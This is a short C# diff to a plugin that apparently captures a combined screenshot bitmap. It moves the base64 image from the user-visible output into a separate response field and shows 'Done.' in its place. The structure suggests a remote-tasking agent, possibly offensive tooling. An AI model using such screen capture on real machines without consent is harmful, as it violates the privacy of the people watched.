@@ -70,8 +70,9 @@ namespace Plugins
                     TaskResponseHandler.AddResponse(new ResponseResult
                     {
                         completed = true,
-                        user_output = combinedBitmapBase64,
+                        user_output = "Done.",
                         task_id = (string)args["task-id"],
+                        process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
                     });
 
                 }
